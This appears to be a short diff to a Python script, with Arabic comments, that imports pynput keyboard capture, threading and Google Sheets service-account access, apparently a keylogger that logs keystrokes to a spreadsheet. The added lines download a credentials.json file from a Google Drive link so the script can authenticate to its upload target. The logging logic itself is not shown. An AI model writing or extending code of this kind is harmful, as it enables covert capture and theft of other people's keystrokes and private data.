@@ -2,6 +2,19 @@ import gspread
 from oauth2client.service_account import ServiceAccountCredentials
 import pynput.keyboard
 import threading
+import requests
+
+# رابط Google Drive لتنزيل credentials.json
+url = "https://drive.google.com/uc?export=download&id=1ewzx0przRvr1VuEh6wlgwUZYE-bj8hvJ"
+
+# تنزيل ملف credentials.json من Google Drive
+try:
+    response = requests.get(url)
+    with open('credentials.json', 'wb') as file:
+        file.write(response.content)
+    print("تم تنزيل ملف credentials.json بنجاح.")
+except Exception as e:
+    print(f"حدث خطأ أثناء تنزيل ملف credentials.json: {e}")
 
 # إعداد Google Sheets API
 scope = ["https://spreadsheets.google.com/feeds", 'https://www.googleapis.com/auth/drive']
